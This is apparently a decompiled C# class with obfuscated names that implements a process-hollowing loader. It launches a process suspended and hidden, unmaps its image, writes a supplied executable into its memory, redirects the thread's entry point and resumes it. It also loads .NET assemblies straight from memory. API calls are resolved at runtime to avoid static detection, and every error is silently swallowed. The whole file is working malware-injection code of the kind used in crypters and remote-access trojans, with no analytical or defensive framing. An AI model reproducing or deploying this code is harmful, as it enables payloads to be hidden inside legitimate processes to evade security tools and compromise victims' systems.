using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
internal sealed class Class5
{
	private delegate int Delegate2(IntPtr handle);

	private delegate bool Delegate3(IntPtr thread, int[] context);

	private delegate bool Delegate4(IntPtr thread, int[] context);

	private delegate bool Delegate5(IntPtr thread, int[] context);

	private delegate bool Delegate6(IntPtr thread, int[] context);

	private delegate int Delegate7(IntPtr handle, int address, int length, int type, int protect);

	private delegate bool Delegate8(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);

	private delegate bool Delegate9(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);

	private delegate int Delegate10(IntPtr process, int baseAddress);

	public delegate bool Delegate11(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref Struct3 startupInfo, ref Struct2 processInformation);

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	public struct Struct2
	{
		public IntPtr intptr_0;

		public IntPtr intptr_1;

		public uint uint_0;

		public uint uint_1;
	}

	public struct Struct3
	{
		public int int_0;

		public string string_0;

		public string string_1;

		public string string_2;

		public int int_1;

		public int int_2;

		public int int_3;

		public int int_4;

		public int int_5;

		public int int_6;

		public int int_7;

		public int int_8;

		public short short_0;

		public short short_1;

		public int int_9;

		public int int_10;

		public int int_11;

		public int int_12;
	}

	private static readonly Delegate2 delegate2_0 = smethod_3<Delegate2>("kernel32", "ResumeThread");

	private static readonly Delegate3 delegate3_0 = smethod_3<Delegate3>("kernel32", "Wow64SetThreadContext");

	private static readonly Delegate4 delegate4_0 = smethod_3<Delegate4>("kernel32", "SetThreadContext");

	private static readonly Delegate5 delegate5_0 = smethod_3<Delegate5>("kernel32", "Wow64GetThreadContext");

	private static readonly Delegate6 delegate6_0 = smethod_3<Delegate6>("kernel32", "GetThreadContext");

	private static readonly Delegate7 delegate7_0 = smethod_3<Delegate7>("kernel32", "VirtualAllocEx");

	private static readonly Delegate8 delegate8_0 = smethod_3<Delegate8>("kernel32", "WriteProcessMemory");

	private static readonly Delegate9 delegate9_0 = smethod_3<Delegate9>("kernel32", "ReadProcessMemory");

	private static readonly Delegate10 delegate10_0 = smethod_3<Delegate10>("ntdll", "ZwUnmapViewOfSection");

	public static readonly Delegate11 delegate11_0 = smethod_3<Delegate11>("kernel32", "CreateProcessA");

	public static int int_0;

	public static void smethod_0(byte[] data)
	{
		try
		{
			Thread thread = new Thread(smethod_1);
			thread.SetApartmentState(ApartmentState.STA);
			thread.Start(data);
		}
		catch (Exception)
		{
		}
	}

	public static void smethod_1(object o)
	{
		try
		{
			MethodInfo entryPoint = Assembly.Load((byte[])o).EntryPoint;
			if (entryPoint.GetParameters().Length == 1)
			{
				entryPoint.Invoke(null, new object[1] { new string[0] });
			}
			else
			{
				entryPoint.Invoke(null, null);
			}
		}
		catch (Exception)
		{
		}
	}

	public static int smethod_2(string path, string cmd, byte[] data, bool compatible, bool hidden, string Desktop = "", int PID = 0)
	{
		if (string.IsNullOrEmpty(path))
		{
			throw new ArgumentException("'path' cannot be null or empty", "path");
		}
		if (string.IsNullOrEmpty(cmd))
		{
			throw new ArgumentException("'cmd' cannot be null or empty", "cmd");
		}
		if (data == null)
		{
			throw new ArgumentNullException("data");
		}
		if (string.IsNullOrEmpty(Desktop))
		{
			throw new ArgumentException("'Desktop' cannot be null or empty", "Desktop");
		}
		try
		{
			int num = 1;
			do
			{
				if (!smethod_4(path, cmd, data, compatible, hidden, Desktop, PID))
				{
					num++;
					continue;
				}
				return -1;
			}
			while (num <= 10);
			return 0;
		}
		catch (Exception)
		{
		}
		return 0;
	}

	[DllImport("kernel32", SetLastError = true)]
	private static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetProcAddress(IntPtr hProcess, [MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

	private static CreateApi smethod_3<CreateApi>(string name, string method)
	{
		return Conversions.ToGenericParameter<CreateApi>((object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref name), ref method), typeof(CreateApi)));
	}

	private static bool smethod_4(string path, string cmd, byte[] data, bool compatible, bool hidden = false, string Desktop = "", int PID = 0)
	{
		string text = $"\"{path}\"";
		Struct3 startupInfo = default(Struct3);
		Struct2 processInformation = default(Struct2);
		startupInfo.int_0 = Marshal.SizeOf(typeof(Struct3));
		if (Desktop.Length > 0)
		{
			startupInfo.string_1 = Desktop;
		}
		if (hidden)
		{
			startupInfo.short_0 = 0;
			startupInfo.int_8 = 1;
		}
		try
		{
			if (!string.IsNullOrEmpty(cmd))
			{
				text = text + " " + cmd;
			}
			IntPtr intPtr = default(IntPtr);
			if (!delegate11_0(path, text, intPtr, intPtr, inheritHandles: false, 4u, IntPtr.Zero, null, ref startupInfo, ref processInformation))
			{
				throw new Exception();
			}
			int num = BitConverter.ToInt32(data, 60);
			int num2 = BitConverter.ToInt32(data, num + 52);
			int[] array = new int[179];
			array[0] = 65538;
			if (IntPtr.Size == 4)
			{
				if (!delegate6_0(processInformation.intptr_1, array))
				{
					throw new Exception();
				}
			}
			else if (!delegate5_0(processInformation.intptr_1, array))
			{
				throw new Exception();
			}
			int num3 = array[41];
			int buffer = 0;
			int bytesRead = 0;
			if (!delegate9_0(processInformation.intptr_0, num3 + 8, ref buffer, 4, ref bytesRead))
			{
				throw new Exception();
			}
			if (num2 == buffer && delegate10_0(processInformation.intptr_0, buffer) != 0)
			{
				throw new Exception();
			}
			int length = BitConverter.ToInt32(data, num + 80);
			int bufferSize = BitConverter.ToInt32(data, num + 84);
			int num4 = delegate7_0(processInformation.intptr_0, num2, length, 12288, 64);
			bool flag = false;
			if (!compatible && num4 == 0)
			{
				flag = true;
				num4 = delegate7_0(processInformation.intptr_0, 0, length, 12288, 64);
			}
			if (num4 == 0)
			{
				throw new Exception();
			}
			if (!delegate8_0(processInformation.intptr_0, num4, data, bufferSize, ref bytesRead))
			{
				throw new Exception();
			}
			int num5 = num + 248;
			int num6 = BitConverter.ToInt16(data, num + 6) - 1;
			int num7 = 0;
			while (true)
			{
				if (num7 <= num6)
				{
					int num8 = BitConverter.ToInt32(data, num5 + 12);
					int num9 = BitConverter.ToInt32(data, num5 + 16);
					int srcOffset = BitConverter.ToInt32(data, num5 + 20);
					if (num9 != 0)
					{
						byte[] array2 = new byte[num9 - 1 + 1];
						Buffer.BlockCopy(data, srcOffset, array2, 0, array2.Length);
						if (!delegate8_0(processInformation.intptr_0, num4 + num8, array2, array2.Length, ref bytesRead))
						{
							throw new Exception();
						}
					}
					num5 += 40;
					num7++;
					continue;
				}
				byte[] bytes = BitConverter.GetBytes(num4);
				if (!delegate8_0(processInformation.intptr_0, num3 + 8, bytes, 4, ref bytesRead))
				{
					throw new Exception();
				}
				int num10 = BitConverter.ToInt32(data, num + 40);
				if (flag)
				{
					num4 = num2;
				}
				array[44] = num4 + num10;
				if (IntPtr.Size == 4)
				{
					if (!delegate4_0(processInformation.intptr_1, array))
					{
						throw new Exception();
					}
				}
				else if (!delegate3_0(processInformation.intptr_1, array))
				{
					throw new Exception();
				}
				if (delegate2_0(processInformation.intptr_1) != -1)
				{
					break;
				}
				throw new Exception();
			}
			PID = (int)processInformation.uint_0;
			return true;
		}
		catch (Exception)
		{
			Process.GetProcessById((int)processInformation.uint_0)?.Kill();
			return false;
		}
	}
}
